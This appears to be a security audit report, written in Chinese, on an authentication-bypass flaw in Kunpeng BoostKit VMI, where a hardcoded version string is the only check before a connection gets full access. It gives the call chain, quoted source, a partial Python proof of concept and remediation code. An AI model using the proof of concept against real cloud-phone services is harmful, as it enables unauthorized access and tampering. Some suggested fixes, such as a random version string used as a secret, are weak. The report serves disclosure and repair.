# cross_module-001：认证链断裂漏洞

## 漏洞概述

**漏洞类型**: Authentication Chain Break (CWE-287)  
**严重级别**: Critical  
**置信度**: 75 (LIKELY)  
**源文件**: Common/Utils/VersionCheck.cpp  
**漏洞位置**: Line 54-85 (CheckVersionServer), Line 113-122 (CheckVersionClient)  
**影响范围**: 整个 VMI 系统认证流程

### 核心问题

VMI 系统使用版本字符串匹配作为唯一的连接准入机制，缺乏真正的身份认证。版本字符串 `ENGINE_VERSION` 是硬编码的公开常量，攻击者可轻易获取并绕过版本检查，从而获得对服务的完整访问权限。

**关键证据**:
- **CommonDefine.h:12**: `static const std::string ENGINE_VERSION = "Kunpeng BoostKit 25.2.RC1";`
- 版本字符串硬编码在源代码中，任何获取源码或逆向分析的人都能获得
- 版本检查仅进行字符串比对，无身份绑定、无会话令牌、无凭证验证

---

## 触发条件

攻击者需要满足以下条件即可触发漏洞：

1. **网络可达性**: 能够访问 VMI 服务端监听的端口
2. **版本字符串**: 知道正确的版本字符串 `"Kunpeng BoostKit 25.2.RC1"`
3. **连接能力**: 能够建立 TCP 连接并发送版本校验数据

**触发门槛**: 极低。版本字符串是公开的硬编码值，任何分析过项目的人都能获取。

---

## 攻击路径

### 完整调用链

```
[服务端视角]
ServerConnection::AcceptNewClient@ServerConnection.cpp:76
  → VersionCheck::CheckVersionServer@VersionCheck.cpp:54
    → VersionCheck::SendPayloadData@VersionCheck.cpp:195 [发送版本字符串]
    → VersionCheck::RecvPayloadData@VersionCheck.cpp:216 [接收客户端返回]
      → VersionCheck::RecvOnceData@VersionCheck.cpp:248
        → VmiRecv@Connection.cpp:292 [接收版本校验结果]
    → 检查 result == matchSuccess (1)
  → [版本匹配成功]
  → ConnectionSocket::SetStatus(SOCKET_STATUS_RUNNING)@ConnectionSocket.cpp:101
  → NetComm::SetSocket@NetComm.cpp:38 [建立完整会话]
  → [攻击者获得完整服务访问权限]

[客户端视角]
ClientConnection::ConnectComm@ClientConnection.cpp:70
  → VersionCheck::CheckVersionServer@VersionCheck.cpp:54
  → [与服务端相同的流程]
  → ConnectionSocket::SetStatus(SOCKET_STATUS_RUNNING)@ConnectionSocket.cpp:106
  → NetComm::SetSocket@NetComm.cpp:108

[客户端视角 - NetController]
NetController::OnNewConnect@NetController.cpp:90
  → VersionCheck::CheckVersionClient@VersionCheck.cpp:95
    → VersionCheck::RecvAndMatchVersion@VersionCheck.cpp:125
      → VersionCheck::RecvPayloadData@VersionCheck.cpp:216 [接收服务端版本]
      → VersionCheck::MatchVersion@VersionCheck.cpp:150 [版本字符串比对]
    → [版本匹配成功]
  → ConnectionSocket::SetStatus(SOCKET_STATUS_RUNNING)@ConnectionSocket.cpp:110
  → NetComm::SetSocket@NetComm.cpp:111
```

### 关键漏洞点

#### 1. 硬编码公开的版本字符串 (CommonDefine.h:12)
```cpp
static const std::string ENGINE_VERSION = "Kunpeng BoostKit 25.2.RC1";
```
- 编译时硬编码，无法动态修改
- 公开存在于源代码中，任何人可获取
- 无唯一性、无随机性、无保密性

#### 2. 仅做字符串匹配的版本检查 (VersionCheck.cpp:150-171)
```cpp
void VersionCheck::MatchVersion(VersionMatchResultInfo& matchInfo)
{
    std::string recvVersionInfo = std::string(reinterpret_cast<const char *>(m_recvData.get()));
    auto split = recvVersionInfo.find('\n');
    matchInfo.serverVersion = recvVersionInfo.substr(0, split);
    matchInfo.serverEngine = recvVersionInfo.substr(split + 1);
    
    // 仅检查字符串是否相等，无身份验证
    if (matchInfo.serverEngine != matchInfo.clientEngine) {
        ERR("Failed to match version, engine mismatch...");
        return;
    }
    if (matchInfo.serverVersion != matchInfo.clientVersion) {
        ERR("Failed to match version, version mismatch...");
        return;
    }
    matchInfo.isMatch = true;  // 直接信任
}
```

#### 3. 版本检查后直接授予权限 (ServerConnection.cpp:76-108)
```cpp
void ServerConnection::AcceptNewClient(int connection)
{
    // 版本号检验
    VersionCheck check(connection, m_engineType);
    if (!check.CheckVersionServer()) {
        ERR("Failed to accpet new client, version check failed");
        VmiCloseConnection(connection);
        return;
    }
    // [版本检查通过后，直接创建会话，无任何额外认证]
    std::unique_ptr<NetComm> netComm = nullptr;
    MAKE_UNIQUE_NOTHROW(netComm, NetComm);
    std::unique_ptr<ConnectionSocket> socket = nullptr;
    MAKE_UNIQUE_NOTHROW(socket, ConnectionSocket, connection);
    // 直接设置为运行态，给予完整访问权限
    socket->SetStatus(VmiSocketStatus::SOCKET_STATUS_RUNNING);
    netComm->SetSocket(std::move(socket));
    // 回调通知上层，连接已建立
    if (m_newConnectionCallback != nullptr) {
        m_newConnectionCallback(*this, std::move(netComm));
    }
}
```

#### 4. 后续模块完全信任已建立的连接

**ConnectionSocket.cpp:21-26** (发送数据时仅检查运行状态):
```cpp
ssize_t ConnectionSocket::Send(const std::pair<uint8_t*, size_t> &sendBuf)
{
    if (GetStatus() != VmiSocketStatus::SOCKET_STATUS_RUNNING) {
        ERR("Failed to send data, fd:%d is disconnect", m_fd);
        return SOCKET_SEND_FAIL_DISCONN;
    }
    // 仅检查状态，无身份验证
    // ...
    ssize_t ret = VmiSend(m_fd, buf, size);
    // ...
}
```

**ConnectionSocket.cpp:56-87** (接收数据时仅检查运行状态):
```cpp
ssize_t ConnectionSocket::Recv(const std::pair<uint8_t*, size_t> &recvBuf)
{
    if (GetStatus() != VmiSocketStatus::SOCKET_STATUS_RUNNING) {
        ERR("Failed to recv data, fd:%d is disconnect", m_fd);
        return SOCKET_SEND_FAIL_DISCONN;
    }
    // 仅检查状态，无身份验证
    ssize_t ret = VmiRecv(m_fd, buf, size);
    // ...
}
```

**NetComm.cpp:60-80** (注册处理器时无认证检查):
```cpp
uint32_t NetComm::SetHandle(VMIMsgType type, std::shared_ptr<PacketHandle> handle)
{
    // 仅检查消息类型有效性，无身份验证
    if (type <= VMIMsgType::INVALID || type >= VMIMsgType::END) {
        ERR("Failed to set handle, Invalid type:%u", type);
        return VMI_ENGINE_HOOK_REGISTER_FAIL;
    }
    // 直接设置处理器，攻击者可发送任意消息类型
    m_streamParser->SetServiceHandle(type, handle);
    m_pktHandle[type] = handle;
    return VMI_SUCCESS;
}
```

**VmiAgent.cpp** (服务端主逻辑处理各种命令):
```cpp
// 接收并处理各种命令，无身份验证
// 包括：VIDEO_GET_ENCODER_PARAM、VIDEO_SET_ENCODER_PARAM、等
// 攻击者可发送任意命令控制视频编码参数、分辨率等
```

---

## PoC 构造思路

### 基本攻击流程

1. **获取版本字符串**:
   - 从源代码获取 `ENGINE_VERSION = "Kunpeng BoostKit 25.2.RC1"`
   - 或通过逆向分析二进制文件获取

2. **建立连接**:
   ```python
   import socket
   
   # 连接到 VMI 服务端
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   sock.connect(("target_host", target_port))
   ```

3. **发送版本校验数据**:
   ```python
   # 构造版本校验消息 (参考 VersionCheck.cpp)
   VERSION_STRAT_FLAG = 0x7665722E  # "ver."
   
   # 版本字符串 + 引擎类型
   version_info = "Kunpeng BoostKit 25.2.RC1\nVideoEngine"
   
   # 构造消息头
   header = struct.pack('<II', VERSION_STRAT_FLAG, len(version_info) + 1)
   
   # 发送版本信息
   sock.send(header + version_info.encode() + b'\x00')
   
   # 接收服务端响应
   response_header = sock.recv(8)
   response_data = sock.recv(4)
   
   # 解析匹配结果
   match_result = struct.unpack('<I', response_data)[0]
   if match_result == 1:
       print("版本匹配成功！获得完整访问权限")
   ```

4. **利用建立的信任连接**:
   ```python
   # 现在可以发送任意 VMIMsgType 消息
   # 例如：控制视频编码参数、发送控制命令等
   
   # 构造消息头 (参考 VmiMsgHead.h)
   MAGICWORD = 0x5A5A
   msg_type = VMIMsgType.CONFIG  # 配置消息类型
   payload_size = len(payload_data)
   
   msg_head = struct.pack('<HBBIIII',
       MAGICWORD,      # magicword
       0,              # flag (SINGLE_FRAGMENT)
       msg_type,       # type
       payload_size,   # size
       msg_seq,        # msgSeq
       murmur_hash     # murmurHash (可选)
   )
   
   # 发送恶意配置
   sock.send(msg_head + payload_data)
   ```

### 攻击场景示例

1. **信息泄露**: 发送命令获取视频编码参数、分辨率等信息
2. **配置篡改**: 修改视频编码参数，影响服务质量
3. **资源滥用**: 发送大量请求占用服务端资源
4. **拒绝服务**: 发送异常数据导致服务崩溃

---

## 影响范围

### 直接影响

1. **认证绕过**: 任何知道版本字符串的人都能建立连接
2. **完整服务访问**: 获得对 VMI 系统的完整访问权限
3. **命令执行**: 可以发送各种 VMIMsgType 命令：
   - VIDEO_GET_ENCODER_PARAM - 获取视频编码参数
   - VIDEO_SET_ENCODER_PARAM - 设置视频编码参数
   - CONFIG 消息 - 配置相关操作
   - HEARTBEAT 消息 - 心跳保活
   - 其他业务消息类型

### 横向影响

**所有依赖版本检查信任的模块**:
- **NetComm**: 网络通信模块，直接信任 SOCKET_STATUS_RUNNING
- **ConnectionSocket**: 连接管理，仅检查状态不验证身份
- **StreamParse**: 流解析模块，信任所有通过版本检查的连接
- **VmiAgent**: 服务端主逻辑，处理所有命令无身份验证
- **PacketHandle**: 数据包处理器，基于 NetComm 的信任关系
- **Heartbeat**: 心跳机制，保持攻击者连接活跃

### 业务影响

1. **云手机服务**: VMI 系统用于云手机场景，攻击者可：
   - 接入云手机实例
   - 控制视频编码质量
   - 发送触摸/按键事件
   - 获取屏幕内容

2. **数据安全**: 视频流数据可能泄露
3. **服务稳定性**: 可能被用于 DoS 攻击
4. **资源浪费**: 未授权用户占用服务资源

---

## 修复建议

### 立即修复方案 (Critical 优先级)

#### 1. 添加真正的身份认证机制

**方案 A: 令牌认证**
```cpp
// 在 CommonDefine.h 中添加
struct AuthToken {
    std::string token;      // 随机生成的会话令牌
    std::string client_id;  // 客户端唯一标识
    uint64_t timestamp;     // 时间戳
    uint32_t signature;     // 签名验证
};

// 修改版本检查流程
bool VersionCheck::Authenticate(const AuthToken& auth) {
    // 1. 版本检查（保留）
    if (!CheckVersion()) {
        return false;
    }
    
    // 2. 令牌验证（新增）
    if (!ValidateToken(auth.token)) {
        ERR("Invalid authentication token");
        return false;
    }
    
    // 3. 签名验证（新增）
    if (!VerifySignature(auth)) {
        ERR("Signature verification failed");
        return false;
    }
    
    return true;
}
```

**方案 B: TLS/SSL 加密认证**
```cpp
// 使用 TLS 建立安全连接
// 在连接建立前要求客户端证书验证
SSL_CTX* ctx = SSL_CTX_new(TLS_server_method());
SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, nullptr);
SSL_CTX_load_verify_locations(ctx, "ca.crt", nullptr);

// 在 ServerConnection::AcceptNewClient 中
SSL* ssl = SSL_new(ctx);
SSL_set_fd(ssl, connection);
if (SSL_accept(ssl) <= 0) {
    ERR("TLS handshake failed");
    SSL_free(ssl);
    VmiCloseConnection(connection);
    return;
}

// 验证客户端证书
X509* cert = SSL_get_peer_certificate(ssl);
if (cert == nullptr || SSL_get_verify_result(ssl) != X509_V_OK) {
    ERR("Client certificate verification failed");
    SSL_free(ssl);
    VmiCloseConnection(connection);
    return;
}
```

#### 2. 版本字符串动态化

```cpp
// 不要使用硬编码静态字符串
// 方案 A: 配置文件
std::string GetEngineVersion() {
    // 从安全配置文件读取（权限 600）
    std::ifstream config("/etc/vmi/version.conf");
    std::string version;
    if (config >> version) {
        return version;
    }
    return GenerateRandomVersion();  // 失败时生成随机版本
}

// 方案 B: 随机生成（每次启动不同）
std::string GenerateSessionVersion() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(100000, 999999);
    
    return "Kunpeng BoostKit " + std::to_string(dis(gen));
}
```

#### 3. 会话绑定机制

```cpp
// 在 ServerConnection 中添加会话管理
class SessionManager {
private:
    std::unordered_map<int, SessionInfo> m_sessions;
    
public:
    bool CreateSession(int connection, const AuthToken& auth) {
        SessionInfo session;
        session.connection_id = connection;
        session.client_id = auth.client_id;
        session.token = GenerateSessionToken();
        session.created_time = time(nullptr);
        
        // 绑定连接与会话
        m_sessions[connection] = session;
        return true;
    }
    
    bool ValidateSession(int connection, const std::string& token) {
        auto it = m_sessions.find(connection);
        if (it == m_sessions.end()) {
            return false;
        }
        
        // 验证令牌匹配
        if (it->second.token != token) {
            return false;
        }
        
        // 检查会话超时
        if (time(nullptr) - it->second.created_time > SESSION_TIMEOUT) {
            m_sessions.erase(it);
            return false;
        }
        
        return true;
    }
};
```

#### 4. 多阶段认证流程

```
[改进后的认证流程]
ServerConnection::AcceptNewClient
  → TLS 握手（可选）
  → 版本检查（保留但弱化）
  → 令牌/证书认证（新增）
  → 会话绑定（新增）
  → 设置 SOCKET_STATUS_RUNNING（仅在认证成功后）
  → NetComm::SetSocket（带会话信息）
```

### 中期改进方案

#### 1. 访问控制列表 (ACL)
```cpp
class AccessControl {
private:
    std::set<std::string> m_allowed_clients;
    
public:
    bool IsClientAllowed(const std::string& client_id) {
        return m_allowed_clients.find(client_id) != m_allowed_clients.end();
    }
    
    void AddAllowedClient(const std::string& client_id) {
        m_allowed_clients.insert(client_id);
    }
};
```

#### 2. 审计日志
```cpp
class AuditLogger {
public:
    void LogAuthentication(int connection, bool success, const std::string& client_id) {
        std::ofstream log("/var/log/vmi/auth.log", std::ios::app);
        log << "[" << time(nullptr) << "] "
            << "Connection: " << connection
            << " Client: " << client_id
            << " Auth: " << (success ? "SUCCESS" : "FAILED")
            << std::endl;
    }
};
```

#### 3. 异常检测
```cpp
class AnomalyDetector {
private:
    std::unordered_map<std::string, int> m_failed_attempts;
    
public:
    bool IsAnomalous(const std::string& client_ip) {
        // 检测短时间内大量认证失败
        if (m_failed_attempts[client_ip] > MAX_FAILED_ATTEMPTS) {
            return true;
        }
        return false;
    }
    
    void RecordFailure(const std::string& client_ip) {
        m_failed_attempts[client_ip]++;
    }
};
```

### 长期安全架构改进

1. **零信任架构**: 每个操作都需要验证，不依赖初始认证
2. **端到端加密**: 所有通信数据加密，防止中间人攻击
3. **安全审计**: 记录所有操作，可追溯异常行为
4. **定期轮换**: 定期更换认证令牌和密钥
5. **安全配置**: 使用安全配置文件，权限严格控制

---

## 验证方法

### 安全测试建议

1. **渗透测试**:
   - 尝试使用硬编码版本字符串建立连接
   - 发送各种消息类型测试权限范围
   - 测试会话管理和超时机制

2. **代码审计**:
   - 检查所有认证相关代码路径
   - 验证是否有绕过认证的后门
   - 检查错误处理是否安全

3. **自动化扫描**:
   - 使用静态分析工具扫描认证相关代码
   - 使用动态分析工具测试认证流程

---

## 参考资料

### CWE 相关
- CWE-287: Improper Authentication
- CWE-306: Missing Authentication for Critical Function
- CWE-863: Incorrect Authorization

### 安全最佳实践
- NIST SP 800-63: Digital Identity Guidelines
- OWASP Authentication Cheat Sheet
- RFC 8446: The Transport Layer Security (TLS) Protocol

---

## 总结

这是一个典型的认证链断裂漏洞，版本检查被错误地用作身份认证机制。核心问题是：

1. **设计缺陷**: 将版本兼容性检查与身份认证混淆
2. **实现问题**: 使用硬编码公开值作为"认证凭证"
3. **架构问题**: 所有后续模块盲目信任通过版本检查的连接

修复需要从根本上引入真正的身份认证机制，而不仅仅是版本匹配。建议优先实施令牌认证或 TLS 证书验证，并添加会话管理、审计日志等安全控制措施。

**修复优先级**: Critical - 应立即修复
**修复工作量**: Medium (1-2 天) - 需要修改多个模块
**修复成本**: Medium - 需要重新设计认证流程
